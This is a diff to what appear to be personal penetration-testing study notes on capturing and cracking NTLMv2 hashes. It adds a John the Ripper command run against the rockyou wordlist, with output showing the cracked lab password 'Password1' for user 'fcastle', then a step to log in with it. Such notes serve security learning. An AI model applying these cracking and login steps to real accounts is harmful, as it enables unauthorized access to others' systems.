@@ -112,9 +112,22 @@
 ┌──(kali㉿kali)-[~]
 └─$ 
 ```
-4. Crack hash using hashcat (maybe)
-5. Utilize password or hash to login
+4. Crack hash (maybe)
+   ```
+    $ john hash.txt -w=/usr/share/wordlists/rockyou.txt               
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+    Will run 2 OpenMP threads
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    Password1        (fcastle)     
+    1g 0:00:00:00 DONE (2025-01-02 20:38) 33.33g/s 136533p/s 136533c/s 136533C/s adriano..oooooo
+    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+    Session completed. 
+                                                                                                                                                                        $ 
+    ```
+5.Utilize password or hash to login
    - Review [Windows\remote-access](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/remote-access.md) for ways to login with either
 ## Tools
 - Responder
 - Hashcat
+- John the ripper
